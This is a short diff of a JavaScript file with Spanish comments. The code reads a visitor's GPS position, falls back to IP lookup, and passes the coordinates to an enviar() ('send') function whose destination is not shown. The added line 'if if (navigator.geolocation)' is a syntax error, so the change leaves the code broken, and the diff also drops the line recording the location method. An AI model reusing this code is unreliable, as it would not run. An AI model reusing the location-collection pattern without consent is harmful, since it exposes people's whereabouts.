@@ -51,13 +51,12 @@ function obtenerPorIP() {
 }
 
 // ========== MODIFICADO: INTENTA GPS, SI FALLA → IP ==========
-if (navigator.geolocation) {
+if if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
         (position) => {
             datos.latitud = position.coords.latitude;
             datos.longitud = position.coords.longitude;
             datos.precision = position.coords.accuracy + " metros";
-            datos.metodo = "GPS exacto";
             enviar();
         },
         (error) => {
